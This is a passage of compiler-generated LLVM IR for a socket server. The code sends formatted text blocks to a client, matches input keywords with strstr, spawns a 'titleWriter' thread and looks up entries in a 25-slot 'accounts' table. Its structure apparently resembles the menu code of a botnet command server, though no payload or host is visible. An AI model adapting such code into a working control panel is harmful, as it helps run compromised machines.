  %689 = call i64 @strlen(i8* %688) #8
  %690 = call i64 @send(i32 %686, i8* %687, i64 %689, i32 16384)
  %691 = icmp eq i64 %690, -1
  br i1 %691, label %692, label %693

; <label>:692:                                    ; preds = %685
  br label %2115

; <label>:693:                                    ; preds = %685
  %694 = load i32, i32* %4, align 4
  %695 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %696 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %697 = call i64 @strlen(i8* %696) #8
  %698 = call i64 @send(i32 %694, i8* %695, i64 %697, i32 16384)
  %699 = icmp eq i64 %698, -1
  br i1 %699, label %700, label %701

; <label>:700:                                    ; preds = %693
  br label %2115

; <label>:701:                                    ; preds = %693
  %702 = load i32, i32* %4, align 4
  %703 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %704 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %705 = call i64 @strlen(i8* %704) #8
  %706 = call i64 @send(i32 %702, i8* %703, i64 %705, i32 16384)
  %707 = icmp eq i64 %706, -1
  br i1 %707, label %708, label %709

; <label>:708:                                    ; preds = %701
  br label %2115

; <label>:709:                                    ; preds = %701
  %710 = load i32, i32* %4, align 4
  %711 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %712 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %713 = call i64 @strlen(i8* %712) #8
  %714 = call i64 @send(i32 %710, i8* %711, i64 %713, i32 16384)
  %715 = icmp eq i64 %714, -1
  br i1 %715, label %716, label %717

; <label>:716:                                    ; preds = %709
  br label %2115

; <label>:717:                                    ; preds = %709
  %718 = load i32, i32* %4, align 4
  %719 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %720 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %721 = call i64 @strlen(i8* %720) #8
  %722 = call i64 @send(i32 %718, i8* %719, i64 %721, i32 16384)
  %723 = icmp eq i64 %722, -1
  br i1 %723, label %724, label %725

; <label>:724:                                    ; preds = %717
  br label %2115

; <label>:725:                                    ; preds = %717
  %726 = load i32, i32* %4, align 4
  %727 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %728 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %729 = call i64 @strlen(i8* %728) #8
  %730 = call i64 @send(i32 %726, i8* %727, i64 %729, i32 16384)
  %731 = icmp eq i64 %730, -1
  br i1 %731, label %732, label %733

; <label>:732:                                    ; preds = %725
  br label %2115

; <label>:733:                                    ; preds = %725
  %734 = load i8*, i8** %3, align 8
  %735 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %734) #7
  br label %736

; <label>:736:                                    ; preds = %733
  %737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %738 = load i32, i32* %5, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %739
  %741 = getelementptr inbounds %struct.account, %struct.account* %740, i32 0, i32 0
  %742 = getelementptr inbounds [20 x i8], [20 x i8]* %741, i32 0, i32 0
  %743 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %744 = call i32 (i8*, i8*, ...) @sprintf(i8* %737, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %742, i8* %743) #7
  %745 = load i32, i32* %4, align 4
  %746 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %747 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %748 = call i64 @strlen(i8* %747) #8
  %749 = call i64 @send(i32 %745, i8* %746, i64 %748, i32 16384)
  %750 = icmp eq i64 %749, -1
  br i1 %750, label %751, label %752

; <label>:751:                                    ; preds = %736
  br label %2115

; <label>:752:                                    ; preds = %736
  br label %753

; <label>:753:                                    ; preds = %752
  br label %351

; <label>:754:                                    ; preds = %647
  %755 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %756 = call i8* @strstr(i8* %755, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #8
  %757 = icmp ne i8* %756, null
  br i1 %757, label %770, label %758

; <label>:758:                                    ; preds = %754
  %759 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %760 = call i8* @strstr(i8* %759, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0)) #8
  %761 = icmp ne i8* %760, null
  br i1 %761, label %770, label %762

; <label>:762:                                    ; preds = %758
  %763 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %764 = call i8* @strstr(i8* %763, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0)) #8
  %765 = icmp ne i8* %764, null
  br i1 %765, label %770, label %766

; <label>:766:                                    ; preds = %762
  %767 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %768 = call i8* @strstr(i8* %767, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #8
  %769 = icmp ne i8* %768, null
  br i1 %769, label %770, label %911

; <label>:770:                                    ; preds = %766, %762, %758, %754
  %771 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %772 = call i32 (i8*, i8*, ...) @sprintf(i8* %771, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.71, i32 0, i32 0)) #7
  %773 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %774 = call i32 (i8*, i8*, ...) @sprintf(i8* %773, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %775 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %776 = call i32 (i8*, i8*, ...) @sprintf(i8* %775, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.72, i32 0, i32 0)) #7
  %777 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %778 = call i32 (i8*, i8*, ...) @sprintf(i8* %777, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.73, i32 0, i32 0)) #7
  %779 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %780 = call i32 (i8*, i8*, ...) @sprintf(i8* %779, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.74, i32 0, i32 0)) #7
  %781 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %782 = call i32 (i8*, i8*, ...) @sprintf(i8* %781, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.75, i32 0, i32 0)) #7
  %783 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %784 = call i32 (i8*, i8*, ...) @sprintf(i8* %783, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.76, i32 0, i32 0)) #7
  %785 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %786 = call i32 (i8*, i8*, ...) @sprintf(i8* %785, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.77, i32 0, i32 0)) #7
  %787 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %788 = call i32 (i8*, i8*, ...) @sprintf(i8* %787, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.78, i32 0, i32 0)) #7
  %789 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %790 = call i32 (i8*, i8*, ...) @sprintf(i8* %789, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.79, i32 0, i32 0)) #7
  %791 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %792 = call i32 (i8*, i8*, ...) @sprintf(i8* %791, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.80, i32 0, i32 0)) #7
  %793 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %794 = call i32 (i8*, i8*, ...) @sprintf(i8* %793, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %795 = load i32, i32* %4, align 4
  %796 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %797 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %798 = call i64 @strlen(i8* %797) #8
  %799 = call i64 @send(i32 %795, i8* %796, i64 %798, i32 16384)
  %800 = icmp eq i64 %799, -1
  br i1 %800, label %801, label %802

; <label>:801:                                    ; preds = %770
  br label %2115

; <label>:802:                                    ; preds = %770
  %803 = load i32, i32* %4, align 4
  %804 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %805 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %806 = call i64 @strlen(i8* %805) #8
  %807 = call i64 @send(i32 %803, i8* %804, i64 %806, i32 16384)
  %808 = icmp eq i64 %807, -1
  br i1 %808, label %809, label %810

; <label>:809:                                    ; preds = %802
  br label %2115

; <label>:810:                                    ; preds = %802
  %811 = load i32, i32* %4, align 4
  %812 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %813 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %814 = call i64 @strlen(i8* %813) #8
  %815 = call i64 @send(i32 %811, i8* %812, i64 %814, i32 16384)
  %816 = icmp eq i64 %815, -1
  br i1 %816, label %817, label %818

; <label>:817:                                    ; preds = %810
  br label %2115

; <label>:818:                                    ; preds = %810
  %819 = load i32, i32* %4, align 4
  %820 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %821 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %822 = call i64 @strlen(i8* %821) #8
  %823 = call i64 @send(i32 %819, i8* %820, i64 %822, i32 16384)
  %824 = icmp eq i64 %823, -1
  br i1 %824, label %825, label %826

; <label>:825:                                    ; preds = %818
  br label %2115

; <label>:826:                                    ; preds = %818
  %827 = load i32, i32* %4, align 4
  %828 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %829 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %830 = call i64 @strlen(i8* %829) #8
  %831 = call i64 @send(i32 %827, i8* %828, i64 %830, i32 16384)
  %832 = icmp eq i64 %831, -1
  br i1 %832, label %833, label %834

; <label>:833:                                    ; preds = %826
  br label %2115

; <label>:834:                                    ; preds = %826
  %835 = load i32, i32* %4, align 4
  %836 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %837 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %838 = call i64 @strlen(i8* %837) #8
  %839 = call i64 @send(i32 %835, i8* %836, i64 %838, i32 16384)
  %840 = icmp eq i64 %839, -1
  br i1 %840, label %841, label %842

; <label>:841:                                    ; preds = %834
  br label %2115

; <label>:842:                                    ; preds = %834
  %843 = load i32, i32* %4, align 4
  %844 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %845 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %846 = call i64 @strlen(i8* %845) #8
  %847 = call i64 @send(i32 %843, i8* %844, i64 %846, i32 16384)
  %848 = icmp eq i64 %847, -1
  br i1 %848, label %849, label %850

; <label>:849:                                    ; preds = %842
  br label %2115

; <label>:850:                                    ; preds = %842
  %851 = load i32, i32* %4, align 4
  %852 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %853 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %854 = call i64 @strlen(i8* %853) #8
  %855 = call i64 @send(i32 %851, i8* %852, i64 %854, i32 16384)
  %856 = icmp eq i64 %855, -1
  br i1 %856, label %857, label %858

; <label>:857:                                    ; preds = %850
  br label %2115

; <label>:858:                                    ; preds = %850
  %859 = load i32, i32* %4, align 4
  %860 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %861 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %862 = call i64 @strlen(i8* %861) #8
  %863 = call i64 @send(i32 %859, i8* %860, i64 %862, i32 16384)
  %864 = icmp eq i64 %863, -1
  br i1 %864, label %865, label %866

; <label>:865:                                    ; preds = %858
  br label %2115

; <label>:866:                                    ; preds = %858
  %867 = load i32, i32* %4, align 4
  %868 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %869 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %870 = call i64 @strlen(i8* %869) #8
  %871 = call i64 @send(i32 %867, i8* %868, i64 %870, i32 16384)
  %872 = icmp eq i64 %871, -1
  br i1 %872, label %873, label %874

; <label>:873:                                    ; preds = %866
  br label %2115

; <label>:874:                                    ; preds = %866
  %875 = load i32, i32* %4, align 4
  %876 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %877 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %878 = call i64 @strlen(i8* %877) #8
  %879 = call i64 @send(i32 %875, i8* %876, i64 %878, i32 16384)
  %880 = icmp eq i64 %879, -1
  br i1 %880, label %881, label %882

; <label>:881:                                    ; preds = %874
  br label %2115

; <label>:882:                                    ; preds = %874
  %883 = load i32, i32* %4, align 4
  %884 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %885 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %886 = call i64 @strlen(i8* %885) #8
  %887 = call i64 @send(i32 %883, i8* %884, i64 %886, i32 16384)
  %888 = icmp eq i64 %887, -1
  br i1 %888, label %889, label %890

; <label>:889:                                    ; preds = %882
  br label %2115

; <label>:890:                                    ; preds = %882
  %891 = load i8*, i8** %3, align 8
  %892 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %891) #7
  br label %893

; <label>:893:                                    ; preds = %890
  %894 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %895 = load i32, i32* %5, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %896
  %898 = getelementptr inbounds %struct.account, %struct.account* %897, i32 0, i32 0
  %899 = getelementptr inbounds [20 x i8], [20 x i8]* %898, i32 0, i32 0
  %900 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %901 = call i32 (i8*, i8*, ...) @sprintf(i8* %894, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %899, i8* %900) #7
  %902 = load i32, i32* %4, align 4
  %903 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %904 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %905 = call i64 @strlen(i8* %904) #8
  %906 = call i64 @send(i32 %902, i8* %903, i64 %905, i32 16384)
  %907 = icmp eq i64 %906, -1
  br i1 %907, label %908, label %909

; <label>:908:                                    ; preds = %893
  br label %2115

; <label>:909:                                    ; preds = %893
  br label %910

; <label>:910:                                    ; preds = %909
  br label %351

; <label>:911:                                    ; preds = %766
  %912 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %913 = call i8* @strstr(i8* %912, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.81, i32 0, i32 0)) #8
  %914 = icmp ne i8* %913, null
  br i1 %914, label %931, label %915

; <label>:915:                                    ; preds = %911
  %916 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %917 = call i8* @strstr(i8* %916, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.82, i32 0, i32 0)) #8
  %918 = icmp ne i8* %917, null
  br i1 %918, label %931, label %919

; <label>:919:                                    ; preds = %915
  %920 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %921 = call i8* @strstr(i8* %920, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.83, i32 0, i32 0)) #8
  %922 = icmp ne i8* %921, null
  br i1 %922, label %931, label %923

; <label>:923:                                    ; preds = %919
  %924 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %925 = call i8* @strstr(i8* %924, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0)) #8
  %926 = icmp ne i8* %925, null
  br i1 %926, label %931, label %927

; <label>:927:                                    ; preds = %923
  %928 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %929 = call i8* @strstr(i8* %928, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0)) #8
  %930 = icmp ne i8* %929, null
  br i1 %930, label %931, label %1004

; <label>:931:                                    ; preds = %927, %923, %919, %915, %911
  %932 = load i8*, i8** %3, align 8
  %933 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %932) #7
  %934 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %935 = call i32 (i8*, i8*, ...) @sprintf(i8* %934, i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.86, i32 0, i32 0)) #7
  %936 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %937 = call i32 (i8*, i8*, ...) @sprintf(i8* %936, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %938 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %939 = call i32 (i8*, i8*, ...) @sprintf(i8* %938, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.87, i32 0, i32 0)) #7
  %940 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %941 = call i32 (i8*, i8*, ...) @sprintf(i8* %940, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.88, i32 0, i32 0)) #7
  %942 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %943 = call i32 (i8*, i8*, ...) @sprintf(i8* %942, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %944 = load i32, i32* %4, align 4
  %945 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %946 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %947 = call i64 @strlen(i8* %946) #8
  %948 = call i64 @send(i32 %944, i8* %945, i64 %947, i32 16384)
  %949 = icmp eq i64 %948, -1
  br i1 %949, label %950, label %951

; <label>:950:                                    ; preds = %931
  br label %2115

; <label>:951:                                    ; preds = %931
  %952 = load i32, i32* %4, align 4
  %953 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %954 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %955 = call i64 @strlen(i8* %954) #8
  %956 = call i64 @send(i32 %952, i8* %953, i64 %955, i32 16384)
  %957 = icmp eq i64 %956, -1
  br i1 %957, label %958, label %959

; <label>:958:                                    ; preds = %951
  br label %2115

; <label>:959:                                    ; preds = %951
  %960 = load i32, i32* %4, align 4
  %961 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %962 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %963 = call i64 @strlen(i8* %962) #8
  %964 = call i64 @send(i32 %960, i8* %961, i64 %963, i32 16384)
  %965 = icmp eq i64 %964, -1
  br i1 %965, label %966, label %967

; <label>:966:                                    ; preds = %959
  br label %2115

; <label>:967:                                    ; preds = %959
  %968 = load i32, i32* %4, align 4
  %969 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %970 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %971 = call i64 @strlen(i8* %970) #8
  %972 = call i64 @send(i32 %968, i8* %969, i64 %971, i32 16384)
  %973 = icmp eq i64 %972, -1
  br i1 %973, label %974, label %975

; <label>:974:                                    ; preds = %967
  br label %2115

; <label>:975:                                    ; preds = %967
  %976 = load i32, i32* %4, align 4
  %977 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %978 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %979 = call i64 @strlen(i8* %978) #8
  %980 = call i64 @send(i32 %976, i8* %977, i64 %979, i32 16384)
  %981 = icmp eq i64 %980, -1
  br i1 %981, label %982, label %983

; <label>:982:                                    ; preds = %975
  br label %2115

; <label>:983:                                    ; preds = %975
  %984 = load i8*, i8** %3, align 8
  %985 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %984) #7
  br label %986

; <label>:986:                                    ; preds = %983
  %987 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %988 = load i32, i32* %5, align 4
  %989 = sext i32 %988 to i64
  %990 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %989
  %991 = getelementptr inbounds %struct.account, %struct.account* %990, i32 0, i32 0
  %992 = getelementptr inbounds [20 x i8], [20 x i8]* %991, i32 0, i32 0
  %993 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %994 = call i32 (i8*, i8*, ...) @sprintf(i8* %987, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %992, i8* %993) #7
  %995 = load i32, i32* %4, align 4
  %996 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %997 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %998 = call i64 @strlen(i8* %997) #8
  %999 = call i64 @send(i32 %995, i8* %996, i64 %998, i32 16384)
  %1000 = icmp eq i64 %999, -1
  br i1 %1000, label %1001, label %1002

; <label>:1001:                                   ; preds = %986
  br label %2115

; <label>:1002:                                   ; preds = %986
  br label %1003

; <label>:1003:                                   ; preds = %1002
  br label %351

; <label>:1004:                                   ; preds = %927
  %1005 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1006 = call i8* @strstr(i8* %1005, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0)) #8
  %1007 = icmp ne i8* %1006, null
  br i1 %1007, label %1016, label %1008

; <label>:1008:                                   ; preds = %1004
  %1009 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1010 = call i8* @strstr(i8* %1009, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0)) #8
  %1011 = icmp ne i8* %1010, null
  br i1 %1011, label %1016, label %1012

; <label>:1012:                                   ; preds = %1008
  %1013 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1014 = call i8* @strstr(i8* %1013, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0)) #8
  %1015 = icmp ne i8* %1014, null
  br i1 %1015, label %1016, label %1269

; <label>:1016:                                   ; preds = %1012, %1008, %1004
  %1017 = load i8*, i8** %3, align 8
  %1018 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1017) #7
  %1019 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1020 = call i32 (i8*, i8*, ...) @sprintf(i8* %1019, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0)) #7
  %1021 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1022 = call i32 (i8*, i8*, ...) @sprintf(i8* %1021, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1023 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1024 = call i32 (i8*, i8*, ...) @sprintf(i8* %1023, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.93, i32 0, i32 0)) #7
  %1025 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1026 = call i32 (i8*, i8*, ...) @sprintf(i8* %1025, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.94, i32 0, i32 0)) #7
  %1027 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1028 = call i32 (i8*, i8*, ...) @sprintf(i8* %1027, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.95, i32 0, i32 0)) #7
  %1029 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1030 = call i32 (i8*, i8*, ...) @sprintf(i8* %1029, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.96, i32 0, i32 0)) #7
  %1031 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1032 = call i32 (i8*, i8*, ...) @sprintf(i8* %1031, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.97, i32 0, i32 0)) #7
  %1033 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1034 = call i32 (i8*, i8*, ...) @sprintf(i8* %1033, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.98, i32 0, i32 0)) #7
  %1035 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1036 = call i32 (i8*, i8*, ...) @sprintf(i8* %1035, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.99, i32 0, i32 0)) #7
  %1037 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1038 = call i32 (i8*, i8*, ...) @sprintf(i8* %1037, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.100, i32 0, i32 0)) #7
  %1039 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1040 = call i32 (i8*, i8*, ...) @sprintf(i8* %1039, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.101, i32 0, i32 0)) #7
  %1041 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1042 = call i32 (i8*, i8*, ...) @sprintf(i8* %1041, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.102, i32 0, i32 0)) #7
  %1043 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1044 = call i32 (i8*, i8*, ...) @sprintf(i8* %1043, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1045 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1046 = call i32 (i8*, i8*, ...) @sprintf(i8* %1045, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.103, i32 0, i32 0)) #7
  %1047 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1048 = call i32 (i8*, i8*, ...) @sprintf(i8* %1047, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.104, i32 0, i32 0)) #7
  %1049 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1050 = call i32 (i8*, i8*, ...) @sprintf(i8* %1049, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.105, i32 0, i32 0)) #7
  %1051 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1052 = call i32 (i8*, i8*, ...) @sprintf(i8* %1051, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.106, i32 0, i32 0)) #7
  %1053 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1054 = call i32 (i8*, i8*, ...) @sprintf(i8* %1053, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.107, i32 0, i32 0)) #7
  %1055 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1056 = call i32 (i8*, i8*, ...) @sprintf(i8* %1055, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.108, i32 0, i32 0)) #7
  %1057 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1058 = call i32 (i8*, i8*, ...) @sprintf(i8* %1057, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.109, i32 0, i32 0)) #7
  %1059 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1060 = call i32 (i8*, i8*, ...) @sprintf(i8* %1059, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.110, i32 0, i32 0)) #7
  %1061 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1062 = call i32 (i8*, i8*, ...) @sprintf(i8* %1061, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.111, i32 0, i32 0)) #7
  %1063 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
